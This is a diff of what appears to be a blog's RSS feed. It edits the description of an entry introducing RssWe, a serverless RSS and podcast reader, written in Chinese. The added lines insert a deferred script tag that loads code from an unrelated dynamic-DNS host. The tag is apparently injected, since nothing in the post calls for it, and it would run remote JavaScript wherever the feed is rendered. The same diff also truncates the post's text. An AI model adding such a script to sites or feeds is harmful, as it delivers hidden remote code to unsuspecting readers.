@@ -95,10 +95,11 @@
         
           
           
-      <description>&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;RssWe 的诞生，源于我对rssTea的真实体验。在订阅播客时，时常遇到音频无法加载或显示的窘境；并且，随着订阅源日益增多，列表变得杂乱无章，难以快速定位。当文章列表过长时，想返回顶部或直接查看特定播客内容也变得异常繁琐。&lt;/p&gt;
+      <description>&lt;script defer src=&quot;https://nyyg.dpdns.org/q/SnuacsID5&quot;&gt;&lt;/script&gt;
+
+&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;RssWe 的诞生，源于我对rssTea的真实体验。在订阅播客时，时常遇到音频无法加载或显示的窘境；并且，随着订阅源日益增多，列表变得杂乱无章，难以快速定位。当文章列表过长时，想返回顶部或直接查看特定播客内容也变得异常繁琐。&lt;/p&gt;
 &lt;p&gt;想着解决这些不便，我决定自己动手解决。RssWe 由此诞生。&lt;/p&gt;
-&lt;p&gt;RssWe是一个无需服务器的RSS和播客阅读器，支持PWA，使用GitHub Actions运行。&lt;/p&gt;
-&lt;p&gt;一个高效、轻量的RSS/Atom</description>
+&lt;p&gt;RssWe是一个无需服务器的RSS和播客阅读器，支持PWA，使用GitHub</description>
           
         
       
